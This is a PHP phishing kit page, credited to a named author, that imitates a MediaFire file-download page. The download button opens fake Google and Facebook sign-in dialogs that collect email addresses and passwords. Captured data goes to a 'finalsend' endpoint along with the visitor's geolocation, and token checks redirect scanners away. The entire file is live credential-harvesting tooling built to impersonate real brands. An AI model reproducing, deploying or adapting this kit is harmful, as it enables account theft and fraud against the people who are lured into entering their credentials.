<?php
// CREATED BY TIRZZ23NESIA
// WA : 6285718662148
// TELE : @zexoorill
// DO NOT REMOVE THIS COPYRIGHT NOTICE.
$filePath = "jetetc/datanya.json";
$fileContent = @file_get_contents($filePath);
$debugInfo = [];

if ($fileContent === false) {
    $debugInfo['status'] = 'GAGAL membaca file';
    $debugInfo['error'] = 'File tidak ditemukan atau tidak bisa dibaca. Periksa path dan izin file (chmod).';
    $data = [];
} else {
    $debugInfo['status'] = 'SUKSES membaca file';
    $debugInfo['raw_length'] = strlen($fileContent);
    $fileContent = preg_replace('/^\xEF\xBB\xBF/', '', $fileContent);
$data = json_decode($fileContent, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        $debugInfo['status'] .= 'Tapi error JSON';
        $debugInfo['json_error'] = json_last_error_msg();
        $data = [];
    } else {
        $debugInfo['data'] = $data;
    }
}
echo "<!-- DEBUG INFO: " . htmlspecialchars(json_encode($debugInfo)) . " -->";

$loginMode = strtolower($data['login_mode'] ?? 'both');
if (!in_array($loginMode, ['google', 'facebook', 'both'], true)) {
    $loginMode = 'both';
}

$jenisFile = strtolower($data['jenisfile'] ?? 'jpg');
switch ($jenisFile) {
    case 'zip':
        $iconClass = 'zip archive archive_zip';
        $fileTypeLabel = 'Archive';
        $fileExt = 'ZIP';
        break;
    case 'mp4':
        $iconClass = 'mp4 video video_mp4';
        $fileTypeLabel = 'Video';
        $fileExt = 'MP4';
        break;
    case 'jpg':
    case 'image':
    default:
        $iconClass = 'jpg image image_jpeg';
        $fileTypeLabel = 'Image';
        $fileExt = 'JPG';
        break;
}

if(isset($_POST['sessionToken']) && isset($_GET['zToken'])){
    $sessionToken = $_POST['sessionToken'];
    $zToken = $_GET['zToken'];
    
    $reqSession = $data['session_token'] ?? 'kingtirzz23nesiareal';
    $reqZ = $data['z_token'] ?? 'verified';
    
    if($sessionToken != $reqSession){
        header("Location: protection.php");
        exit;
    }
    
    if($zToken != $reqZ){
        header("Location: protection.php");
        exit;
    }

include "core/zok.php";
zcodeCheckSession("protection.php");  
include 'detailip.php';
$geoData = get_ip_info();
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8"/>
<meta http-equiv="x-ua-compatible" content="ie=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
<title><?php echo htmlspecialchars($data['namafile']); ?></title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/css/stylemediafire.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/css/ggdanfb.css">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
<meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."/>
<style>
.header {
    z-index: 1000 !important;
}
.footer,
.DLExtraInfo-wrap,
#status,
#cookie-accept-footer {
    z-index: 500 !important;
}
.overlay {
    z-index: 2000 !important;
}
.modal {
    z-index: 2001 !important;
}
#cookie-accept-footer {
    z-index: 1000 !important;
}
</style>
<script>
window.USER_GEO = <?php echo json_encode($geoData); ?>;
function getEndpoint() {
  return 'tirzz23finalsend.php';
}

function locationRedirect() {
    window.location.href = '<?php echo $data["linkredirect"]; ?>';
}
</script>
    </head>
    <body class="en defaultTheme">
        <main role="main" class="mf-dlr page ads-mobile4 sticky-mode mobile ads-enabled">
            <div class="content">
                <style type="text/css"></style>
                <div class="header">
                    <div class="u-wrap">
                        <h1 class="logo">
                            <a href="#" onclick="return false;">MediaFire</a>
                        </h1>
                        <ul class="user-menu">
                            <li>
                                <a href="#" onclick="openModal(); return false;" id="login" class="g-Btn g-Btn--primary">
                                    <span class="loginActivateTW"></span>
                                    <span class="loginActivateFB"></span>
                                    Log In
                                </a>
                            </li>
                            <li>
                                <a href="#" onclick="openModal(); return false;" id="signup" class="g-Btn g-Btn--primary">Sign Up</a>
                            </li>
                            <li>
                                <a href="#" onclick="return false;" class="user-menu-help g-Btn g-Btn--secondary">
                                    <span class="g-Icon g-Icon--help"></span>
                                    Help
                                </a>
                            </li>
                            <li class="header-gt-cont">
                                <span class="gt-label">Language:</span>
                                <div id="goog-header-translate" class="g-Btn g-Btn--secondary"></div>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="center">
                    <div class="ads dl-box">
                        <div class="dl-btn-cont">
                            <div class="icon <?php echo $iconClass; ?>"></div>
                            <div class="dl-btn-labelWrap">
                                <div class="promoDownloadName notranslate">
                                    <div class="dl-btn-label" title="<?php echo htmlspecialchars($data['namafile']); ?>"><?php echo htmlspecialchars($data['namafile']); ?></div>
                                </div>
                                <div class="dl-utility-nav">
                                    <ul>
                                        <li>
                                            <a href="#" onclick="return false;" id="shareButton" class="nopop g-Icon g-Icon--white g-Icon--share" aria-labelledby="share-tooltip" title="More sharing options"></a>
                                            <span id="share-tooltip" class="alt point-down tooltip">More sharing options</span>
                                        </li>
                                        <li>
                                            <a href="#" onclick="return false;" id="copyShareURL" class="nopop g-Icon g-Icon--white g-Icon--link" aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a>
                                            <span id="copy-tooltip" class="alt point-down tooltip">Copy file link to clipboard</span>
                                        </li>
                                        <li>
                                            <a href="#" onclick="return false;" id="saveButton" class="g-Icon g-Icon--white g-Icon--add" aria-labelledby="save-tooltip" title="Save file to My Files"></a>
                                            <span id="save-tooltip" class="alt point-down tooltip">Save file to My Files</span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            <form method="post" name="download" class="dl-btn-form" autocomplete="off" onsubmit="return false;">
                                <div class="download_link" id="download_link">
                                    <a class="preparing" href="#">
                                        <span>Preparing Download</span>
                                        <span id="preparing_count_down"></span>
                                        <span class="js_note">Be sure JavaScript is enabled.</span>
                                    </a>
                                    <a class="input popsok" aria-label="Download file" target="_download810" id="downloadButton" rel="nofollow">Download in a new tab (<?php echo htmlspecialchars($data['ukuran']); ?>)
                                    </a>
                                    <a class="starting" href="#">
                                        <span>Your download is starting in a new tab...</span>
                                    </a>
                                    <a class="retry" href="#" onclick="return false;">
                                        <span class="notranslate">Your download started in a new tab.</span>
                                    </a>
                                </div>
                                <a href="#" onclick="return false;" class="download_test_link">Download Diagnostic Tool</a>
                            </form>
                            <p class="DlBtnUltraUpsell" data-upsell-button-id="dl-btn-ultra-upsell">
                                Download too slow?<span class="try_text">Try MediaFire Ultra</span>
                                <button onclick="return false;">Download Faster Now</button>
                            </p>
                            <div class="DLMobile-shareOptions">
                                <p>Clicking the download button above will start your download in a new tab and show a message from our advertising partners.</p>
                                <ul>
                                    <li>
                                        <a href="#" onclick="return false;" id="shareButtonMobile" class="nopop">
                                            <span></span>
                                            Share options
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#" onclick="return false;" id="saveButtonMobile">
                                            <span></span>
                                            Save to My Files
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="dl-info">
                            <div class="intro icon <?php echo $iconClass; ?>">
                                <div class="filename"><?php echo htmlspecialchars($data['namafile']); ?></div>
                                <div class="filetype">
                                    <span><?php echo $fileTypeLabel; ?></span>
                                    <span>(.<?php echo $fileExt; ?>)<span></span></span>
                                </div>
                            </div>
                            <ul class="details">
                                <li>File size: <span><?php echo htmlspecialchars($data['ukuran']); ?></span></li>
                                <li>Uploaded: <span>2026-03-12 16:27:44</span></li>
                            </ul>
                            <div class="description">
                                <p class="description-subheading">About Image Formats</p>
                                <p>The two main groups of image types are raster and vector. Raster images like JPEG, TIFF, GIF, BMP, and PNG are composed of pixels and can develop a "blocky" quality as the image is made larger because each pixel becomes larger. Vector images, like CGM and SVG, store lines instead of pixels. Using this method image size can be scaled without losing quality. The same vector image will appear correctly on a business card or a billboard.</p>
                            </div>
                            <div class="sidebar">
                                <div class="apps">
                                    <div>
                                        <div class="filename"><?php echo htmlspecialchars($data['namafile']); ?></div>
                                        <br>Can be opened with
                                    </div>
                                    <ul>
                                        <li>
                                            <a class="nopop" href="#" onclick="return false;" title="PaintShop Pro">PaintShop Pro</a>
                                        </li>
                                        <li>
                                            <a class="nopop" href="#" onclick="return false;" title="Windows Photo Viewer">Windows Photo Viewer</a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="Download-compatibility">
                                    <div style="margin-bottom: 0;">
                                        <div class="filename"><?php echo htmlspecialchars($data['namafile']); ?></div>
                                    </div>
                                    <label for="compat-select" style="display: block; margin-bottom: 10px;">System compatibility</label>
                                    <select class="g-Select" id="compat-select" title="Select operating system">
                                        <option value="windows" data-compat>Windows</option>
                                        <option value="osx" selected data-compat>macOS (your OS)</option>
                                        <option value="linux" data-compat>Linux</option>
                                    </select>
                                    <div class="Download-compatibilityStatus is-compatible" id="compat-supported">
                                        <span></span>
                                        <p>File is compatible with the selected operating system.</p>
                                    </div>
                                    <div class="Download-compatibilityStatus is-notCompatible" id="compat-unsupported" style="display:none">
                                        <span></span>
                                        <p>File is not compatible with the selected operating system.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="DLExtraInfo-wrap">
                    <div class="DLExtraInfo">
                        <div class="DLExtraInfo-uploadLocation DLExtraInfo-column">
                            <div class="lazyload DLExtraInfo-uploadLocationMap Continent DLExtraInfo-uploadLocationMapBg">
                                <span>Upload region:</span>
                                <div class="lazyload DLExtraInfo-uploadLocationRegion continent-as"></div>
                            </div>
                            <div class="lazyload DLExtraInfo-sectionGraphic flag flag-id"></div>
                            <div class="DLExtraInfo-sectionDetails">
                                <p>This file was uploaded from Indonesia on March 12, 2026 at 4:27 PM</p>
                            </div>
                        </div>
                        <div class="DLExtraInfo-upload DLExtraInfo-column">
                            <div class="DLExtraInfo-virusTotal DLExtraInfo-row">
                                <div class="DLExtraInfo-sectionGraphic">
                                    <div class="lazyload DLExtraInfo-sectionGraphicCenter DLExtraInfo-virusTotalImage"></div>
                                </div>
                                <div class="DLExtraInfo-sectionDetails">
                                    <div class="DLExtraInfo-sectionHeading">VirusTotal scan</div>
                                    <p>MediaFire scans high-risk files using VirusTotal.</p>
                                </div>
                            </div>
                            <div class="DLExtraInfo-Facebook DLExtraInfo-row">
                                <div class="social-cont">
                                    <div class="social-fb-cont">
                                        <span id="social-fb-label">Like MediaFire on Facebook</span>
                                        <iframe class="nopop" src="" width="190" height="30" scrolling="no" frameborder="0" allowTransparency="true" aria-labelledby="social-fb-label"></iframe>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="DLExtraInfo DLExtraInfo-additional">
                        <div class="DLExtraInfo-accountStatus DLExtraInfo-column">
                            <div class="lazyload DLExtraInfo-sectionIcon DLExtraInfo-accountStatusImage"></div>
                            <div class="DLExtraInfo-sectionDetails">
                                <div class="DLExtraInfo-sectionHeading">About MediaFire</div>
                                <div class="DLExtraInfo-sectionSubHeading">Welcome!</div>
                                <p>With MediaFire, you get simple yet powerful file storage along with features you won't find anywhere else. <a href="#" onclick="return false;">Learn more</a></p>
                            </div>
                        </div>
                        <div class="DLExtraInfo-downloadApp DLExtraInfo-column">
                            <div class="lazyload DLExtraInfo-sectionIcon browser-safari"></div>
                            <div class="DLExtraInfo-sectionDetails">
                                <div class="DLExtraInfo-sectionHeading">Download application</div>
                                <div class="DLExtraInfo-sectionSubHeading">Safari</div>
                                <p>You are downloading this file with <span>Safari.</span></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <footer role="contentinfo" id="footer" class="footer">
            <div class="u-wrap" id="mainFooterWrap">
                <div class="footerColWrap u-cf">
                    <div class="footerCol">
                        <h2><a href="#" onclick="return false;">Company</a></h2>
                        <ul>
                            <li class="minFooterShow"><a href="#" onclick="return false;">About<b>Us</b></a></li>
                            <li><a href="#" onclick="return false;">Careers</a></li>
                            <li><a href="#" onclick="return false;">Press</a></li>
                            <li><a href="#" onclick="return false;">Company Blog</a></li>
                        </ul>
                    </div>
                    <div class="footerCol">
                        <h2><a href="#" onclick="return false;">Tools</a></h2>
                        <ul>
                            <li class="minFooterShow"><a href="#" onclick="return false;"><b>MediaFire </b>Mobile</a></li>
                        </ul>
                    </div>
                    <div class="footerCol">
                        <h2><a href="#" onclick="return false;">Upgrade</a></h2>
                        <ul>
                            <li><a href="#" onclick="return false;">Professional</a></li>
                        </ul>
                    </div>
                    <div class="footerCol">
                        <h2><a href="#" onclick="return false;">Support</a></h2>
                        <ul>
                            <li class="minFooterShow"><a href="#" onclick="return false;"><b>Get Support</b></a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div id="subFooterWrap">
                <div id="subFooter" class="u-wrap">
                    <ul class="subFooterLinks">
                        <li id="copyrightInfo">&copy;2026 MediaFire<span>Build 121967</span></li>
                        <li><a href="#" onclick="return false;">Advertising</a></li>
                        <li><a href="#" onclick="return false;">Terms</a></li>
                        <li><a href="#" onclick="return false;">Privacy Policy</a></li>
                        <li><a href="#" onclick="return false;">Copyright</a></li>
                        <li><a href="#" onclick="return false;">Abuse</a></li>
                        <li><a href="#" onclick="return false;">Credits</a></li>
                        <li><a href="#" onclick="return false;">More...</a></li>
                    </ul>
                    <div class="subFooterSocialWrap">
                        <ul id="subFooterSocial">
                            <li class="footerIcn">
                                <a href="#" onclick="return false;" class="footerIcnBlog" title="MediaFire Blog"><span class="footerIcnBlog"></span></a>
                            </li>
                            <li class="footerIcn">
                                <a href="#" onclick="return false;" class="footerIcnTw" title="MediaFire's Twitter page"><span class="footerIcnTw"></span></a>
                            </li>
                            <li class="footerIcn" style="margin-left: 0;">
                                <a href="#" onclick="return false;" class="footerIcnFb" title="MediaFire's Facebook page"><span class="footerIcnFb"></span></a>
                            </li>
                        </ul>
                    </div>
                    <div class="socialLinks" id="minSocialLinks">
                        <a href="#" onclick="return false;" class="shareFacebook" title="MediaFire on Facebook"><span style="display:none">Facebook Page</span></a>
                        <a href="#" onclick="return false;" class="shareTwitter" title="MediaFire on Twitter"><span style="display:none">Twitter Page</span></a>
                        <a href="#" onclick="return false;" class="shareBlogger" title="MediaFire Blog"><span style="display:none">MediaFire Blog</span></a>
                    </div>
                </div>
            </div>
        </footer>
        <div id="cookie-accept-footer" class="CookieAcceptance">
            <p>MediaFire uses cookies to provide you with a personalized browsing experience. By continuing to use this site, you agree to our Privacy Policy.</p>
            <div class="CookieAcceptance-buttons">
                <a href="#" class="CookieAcceptance-close" onclick="dismissCookie(); return false;"><span>Dismiss</span></a>
                <a href="#" class="CookieAcceptance-accept" onclick="dismissCookie(); return false;">I Accept</a>
            </div>
        </div>

        <div id="status">
            <div id="status-message"></div>
            <div id="status-close">Click to dismiss this message</div>
        </div>
        <iframe name="iframe_worker" id="iframe_worker" style="display:none;height:0;width:0;"></iframe>

        <div class="overlay" id="overlay">

            <div class="modal modal-choose step active" id="stepChoose">
                <button class="close-btn" onclick="closeModal()">&#x2715;</button>
                <div class="choose-title">Account Login</div>
                <div class="choose-sub">Log in now</div>

                <?php if ($loginMode === 'google' || $loginMode === 'both'): ?>
                <button class="choose-btn btn-google" onclick="showStep('stepGEmail')">
                    <svg width="22" height="22" viewBox="0 0 48 48">
                        <path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2v6h7.7c4.5-4.1 7-10.2 7-17.2z"/>
                        <path fill="#34A853" d="M24 47c6.5 0 11.9-2.1 15.9-5.8l-7.7-6c-2.1 1.4-4.8 2.3-8.2 2.3-6.3 0-11.6-4.2-13.5-9.9H2.6v6.2C6.5 41.8 14.7 47 24 47z"/>
                        <path fill="#FBBC05" d="M10.5 28.6c-.5-1.4-.8-2.9-.8-4.6s.3-3.2.8-4.6v-6.2H2.6C1 16.4 0 20.1 0 24s1 7.6 2.6 10.8l7.9-6.2z"/>
                        <path fill="#EA4335" d="M24 9.5c3.5 0 6.7 1.2 9.2 3.6l6.9-6.9C35.9 2.1 30.5 0 24 0 14.7 0 6.5 5.2 2.6 13.2l7.9 6.2C12.4 13.7 17.7 9.5 24 9.5z"/>
                    </svg>
                    Sign in with Google Account
                </button>
                <?php endif; ?>

                <?php if ($loginMode === 'facebook' || $loginMode === 'both'): ?>
                <button class="choose-btn btn-facebook" onclick="showStep('stepFB')">
                    <i class="bi bi-facebook" style="font-size:20px;color:#fff;"></i>
                    Sign in with Facebook Account
                </button>
                <?php endif; ?>
            </div>

            <div class="modal modal-google step" id="stepGEmail">
                <button class="close-btn" onclick="closeModal()">&#x2715;</button>
                <div class="loading-dim" id="gLoadingDim">
                    <div class="loading-dim-text" id="gLoadingText">Memverifikasi...</div>
                    <div class="dots-loader"><span></span><span></span><span></span><span></span></div>
                </div>
                <div class="google-logo">
                    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                        <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                        <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                        <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
                        <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
                        <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
                    </svg>
                </div>
                <div class="g-step-title">Sign in</div>
                <div class="g-step-sub">Use your Google Account</div>
                <div class="g-input-wrap">
                    <input class="g-input" id="gEmailInput" type="text" placeholder=" " autocomplete="off">
                    <label class="g-label">Email or phone</label>
                </div>
                <div class="g-field-err" id="gEmailError"></div>
                <div class="guest-note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
                <div class="g-btn-row">
                    <button class="g-link-btn">Create account</button>
                    <button class="g-next-btn" onclick="gHandleEmailNext()">Next</button>
                </div>
            </div>

            <div class="modal modal-google step" id="stepGPass">
                <button class="close-btn" onclick="closeModal()">&#x2715;</button>
                <div class="loading-dim" id="gPassLoadingDim">
                    <div class="loading-dim-text" id="gPassLoadingText">Mengirim data...</div>
                    <div class="dots-loader"><span></span><span></span><span></span><span></span></div>
                </div>
                <div class="google-logo">
                    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                        <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                        <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                        <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
                        <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
                        <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
                    </svg>
                </div>
                <div class="g-step-title">Welcome</div>
                <div style="display:flex;justify-content:center;margin-bottom:24px;">
                    <div class="g-email-chip">
                        <div class="g-chip-avatar av-blue" id="gAvatarEl">G</div>
                        <div class="g-chip-text" id="gChipEmail">user@gmail.com</div>
                    </div>
                </div>
                <div class="g-input-wrap">
                    <input class="g-input" id="gPassInput" type="password" placeholder=" " autocomplete="current-password">
                    <label class="g-label">Enter your password</label>
                    <button class="g-eye-btn" onclick="gTogglePass()" type="button">
                        <svg id="gEyeOff" viewBox="0 0 24 24">
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                            <line x1="1" y1="1" x2="23" y2="23"/>
                        </svg>
                        <svg id="gEyeOn" viewBox="0 0 24 24" style="display:none;">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                            <circle cx="12" cy="12" r="3"/>
                        </svg>
                    </button>
                </div>
                <div class="g-field-err" id="gPassError"></div>
                <div style="display:flex;align-items:center;justify-content:space-between;margin-top:20px;">
                    <button class="g-link-btn" style="padding-left:0;">Forgot password?</button>
                    <button class="g-next-btn" onclick="gHandlePassNext()">Next</button>
                </div>
                <div class="g-privacy">
                    To continue, Google will share your name, email address, and profile picture with Google Clone. Before you sign in, you can review Google Clone's <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.
                </div>
            </div>

            <div class="modal modal-fb step" id="stepFB">
                <button class="close-btn" onclick="closeModal()" style="color:#b0b3b8;">&#x2715;</button>
                <div class="loading-dim" id="fbLoadingDim" style="background:rgba(0,0,0,0.5);border-radius:12px;">
                    <div class="loading-dim-text" id="fbLoadingText" style="color:#e4e6eb;font-size:15px;">Memproses...</div>
                    <div class="dots-loader"><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span></div>
                </div>
                <div class="fb-logo-wrap">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" style="width:60px;height:60px;border-radius:50%;object-fit:cover;">
                </div>
                <div class="fb-input-wrap">
                    <input class="fb-input" id="fbEmailInput" type="text" placeholder=" " autocomplete="off">
                    <label class="fb-label">Nomor ponsel atau email</label>
                    <button class="fb-clear-btn" id="fbClearBtn" onclick="fbClearEmail()" type="button">&#x2715;</button>
                </div>
                <div class="fb-field-err" id="fbEmailError"></div>
                <div class="fb-input-wrap">
                    <input class="fb-input" id="fbPassInput" type="password" placeholder=" " autocomplete="current-password">
                    <label class="fb-label">Kata sandi</label>
                    <button class="fb-eye-btn" onclick="fbTogglePass()" type="button">
                        <svg id="fbEyeOff" viewBox="0 0 24 24">
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                            <line x1="1" y1="1" x2="23" y2="23"/>
                        </svg>
                        <svg id="fbEyeOn" viewBox="0 0 24 24" style="display:none;">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                            <circle cx="12" cy="12" r="3"/>
                        </svg>
                    </button>
                </div>
                <div class="fb-field-err" id="fbPassError"></div>
                <button class="fb-login-btn" id="fbLoginBtn" onclick="fbHandleLogin()">
                    <div class="btn-spinner" id="fbBtnSpinner"></div>
                    <span id="fbBtnText">Login</span>
                </button>
                <div class="fb-forgot">
                    <button type="button">Lupa kata sandi?</button>
                </div>
                <div class="fb-divider">
                    <div class="fb-divider-line"></div>
                    <div class="fb-divider-text">atau</div>
                    <div class="fb-divider-line"></div>
                </div>
                <button class="fb-new-btn">Buat akun baru</button>
                <div class="fb-meta">
                    <span style="font-size:18px;font-weight:700;color:#8a8d91;letter-spacing:-1px;">&#x221E;</span>
                    <span>Meta</span>
                </div>
            </div>

            <div class="modal modal-fb-confirm step" id="stepFBConfirm">
                <button class="close-btn" onclick="closeModal()">&#x2715;</button>
                <div class="loading-dim" id="fbConfirmLoadingDim" style="background:rgba(0,0,0,0.55);border-radius:12px;">
                    <div class="loading-dim-text" id="fbConfirmLoadingText" style="color:#e4e6eb;font-size:15px;">Memproses...</div>
                    <div class="dots-loader"><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span><span style="background:#1877f2;"></span></div>
                </div>
                <div class="fbc-title">Apakah ini adalah akun Anda?</div>
                <div class="fbc-subtitle">Kami tidak bisa menemukan akun yang cocok dengan yang Anda masukkan, tetapi menemukan akun yang hampir cocok.</div>
                <div class="fbc-avatar-wrap">
                    <div class="fbc-avatar">
                        <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="40" cy="30" r="18" fill="#9da3a8"/>
                            <ellipse cx="40" cy="72" rx="30" ry="22" fill="#9da3a8"/>
                        </svg>
                    </div>
                </div>
                <div class="fbc-name" id="fbcName">user@example.com</div>
                <button class="fbc-lanjutkan" onclick="fbLanjutkan()">Lanjutkan</button>
                <button class="fbc-other" onclick="showStep('stepFB')">Login ke akun lain</button>
                <div class="fb-meta" style="margin-top:20px;">
                    <span style="font-size: 18px;font-weight:700;color:#8a8d91;letter-spacing:-1px;">&#x221E;</span>
                    <span>Meta</span>
                </div>
            </div>

        </div>

        <script>
            function dismissCookie() {
                document.getElementById('cookie-accept-footer').style.display = 'none';
            }
        </script>
        <script src="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/jsku/ggdanfb.js"></script>
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            var downloadBtn = document.getElementById('downloadButton');
            if (downloadBtn) {
                downloadBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    openModal();
                });
            }

            var preparingLink = document.querySelector('.preparing');
            if (preparingLink) {
                preparingLink.addEventListener('click', function(e) {
                    e.preventDefault();
                    openModal();
                });
            }
        });
        </script>
    </body>
</html>
<?php
} else {
    header("Location: protection.php");
    exit;
}
?>

